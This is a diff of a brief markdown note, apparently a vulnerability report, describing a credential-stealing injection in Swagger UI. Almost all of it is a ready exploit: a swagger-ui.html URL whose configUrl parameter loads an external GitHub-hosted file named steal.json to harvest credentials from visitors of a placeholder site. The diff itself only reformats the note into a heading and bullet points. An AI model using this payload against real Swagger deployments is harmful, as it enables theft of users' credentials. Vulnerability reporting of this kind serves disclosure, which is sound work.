@@ -1,6 +1,7 @@
-Site:
+#Issue: Credentials Stealing: Injection Vulnerability on a Swagger Endpoint
 
-site.com/swagger-ui.html
+Site:
+- site.com/swagger-ui.html
 
 Exploit:
-site.com/swagger-ui.html?configUrl=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.json
+- site.com/swagger-ui.html?configUrl=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.json
